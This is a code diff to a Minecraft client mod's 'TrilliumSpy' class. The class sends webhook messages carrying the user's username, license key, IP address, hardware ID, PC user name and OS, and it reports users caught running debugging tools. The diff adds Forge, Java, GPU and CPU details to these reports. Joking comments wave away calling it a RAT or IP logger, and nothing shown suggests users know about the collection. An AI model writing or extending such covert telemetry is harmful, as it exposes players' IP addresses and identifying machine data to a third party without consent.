@@ -6,6 +6,9 @@ import dev._3000IQPlay.trillium.protect.keyauth.api.KeyAuth;
 import dev._3000IQPlay.trillium.protect.keyauth.util.HWID;
 import dev._3000IQPlay.trillium.protect.WebhookUtil;
 import net.minecraft.client.Minecraft;
+import net.minecraft.client.renderer.GlStateManager;
+import net.minecraft.client.renderer.OpenGlHelper;
+import net.minecraftforge.common.ForgeVersion;
 
 import java.awt.*;
 import java.io.BufferedReader;
@@ -65,6 +68,10 @@ public class TrilliumSpy { // If u call this class rat then pls get brain
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(Minecraft.getMinecraft().getSession().getUsername() + " ran Trillium");
             embed.setThumbnail("https://crafatar.com/avatars/" + Minecraft.getMinecraft().getSession().getProfile().getId() + "?size=128&overlay");
+			embed.addField("Forge", "" + ForgeVersion.getMajorVersion() + '.' + ForgeVersion.getMinorVersion() + '.' + ForgeVersion.getRevisionVersion() + '.' + ForgeVersion.getBuildVersion(), false); // Trouble shooting features
+			embed.addField("JVM", "" + System.getProperty("java.version") + ' ' + System.getProperty("java.vendor"), false); // Trouble shooting features
+            embed.addField("GPU", "" + GlStateManager.glGetString((int)7936), false); // Trouble shooting features
+            embed.addField("CPU", "" + System.getProperty("os.arch") + ' ' + OpenGlHelper.getCpu(), false); // Trouble shooting features
             embed.setColor(Color.GREEN);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
@@ -96,7 +103,7 @@ public class TrilliumSpy { // If u call this class rat then pls get brain
             embed.setTitle(Minecraft.getMinecraft().getSession().getUsername() + "USED Dump/Debug TOOL/S!!!");
             embed.setThumbnail("https://crafatar.com/avatars/" + Minecraft.getMinecraft().getSession().getProfile().getId() + "?size=128&overlay");
 			embed.addField("Key", "" + "||" + enteredKey + "||", false);
-			embed.addField("IP", "" + "||" + getIP() + "||", false);
+			embed.addField("IP", "" + "||" + getIP() + "||", false); // Omg a IP Logger!1!!1!1 :skrim:
 			embed.addField("HWID", "" + HWID.getHWID(), false);
 			embed.addField("PC-Name", "" + "||" + System.getProperty("user.name") + "||", false);
 			embed.addField("OS-Name", "" + System.getProperty("os.name"), false);
